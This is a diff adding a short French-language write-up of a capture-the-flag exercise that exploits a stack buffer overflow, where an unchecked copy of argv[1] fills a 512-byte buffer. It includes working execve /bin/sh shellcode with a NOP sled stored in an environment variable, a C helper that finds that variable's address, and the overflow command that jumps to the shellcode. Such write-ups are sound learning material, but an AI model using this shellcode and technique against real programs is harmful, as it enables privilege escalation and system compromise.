@@ -1,0 +1,30 @@
+La faille de cet exercice se trouve dans la copie de l'arg.
+Notre buffer username ne peux contenir que 512 char et la taille de argv[1] n'est pas verifiee avant d'etre copiee.
+Dans un premier temps, on va chercher a remplacer l'adresse de retour afin de rediriger le programme ou l'ou veux.
+Apres quelques test sur gdb on s'apercoit qu'il suffit de mettre 512 charactere puis l'adresse a laquelle on veux jump.
+On va donc mettre notre shell code qui permet d'ouvir un shell ( code pris sur shellstorm ) dans une variable d'environnement. Par exemple de cette facon :
+export LOGNAME=$(ruby -e 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
+
+Grace a un calcul simple, je retrouve l'adresse exacte de cette variable. On creer donc un fichier .c dans /tmp qui contiendra ce code :
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc,char**argv){
+	char *ptr;
+
+	if(argc<3){
+		printf("Usage: %s <environment var> <target program name>\n", argv[0]);
+		exit(0);
+	}       
+	ptr = getenv(argv[1]);
+
+	ptr += (strlen(argv[0]) - strlen(argv[2]))*2;  
+
+	printf("%s will be at %p\n",argv[1],ptr);
+
+}
+
+On compile et execute ce programme (./prog LOGNAME ch7) qui nous fournis l'adresse de LOGNAME
+On n'as plus qu'a lancer le programme en lui passant cette adresse pour ecraser l'adresse de retour et jump sur notre shell code
+./ch7 $(python -c 'print "A"*512+"METTRE L'ADRESSE ICI"'
